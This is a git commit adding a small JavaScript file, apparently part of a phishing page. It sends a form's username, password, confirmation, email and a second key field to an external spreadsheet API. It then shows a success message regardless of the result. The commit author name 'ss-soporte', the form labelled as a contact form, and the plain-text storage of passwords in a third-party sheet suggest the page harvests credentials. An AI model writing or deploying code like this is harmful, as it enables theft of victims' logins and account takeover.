02fa8cb4c12a6c1f76c2d4ed81cdea1618d72546
ss-soporte <cyclemoor4@gmail.com>
2024-12-16 12:46:41 -0600

    add files

---
+++ js/folio003.js
@@ -0,0 +1,33 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/2d91b976-f2cd-4f48-9916-421822fda8b4', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "1": formulario.usuario.value,
+            "2": formulario.contraseña.value,
+            "3": formulario.confirmar.value,
+            "4": formulario.correo.value,
+            "5": formulario.clave2.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
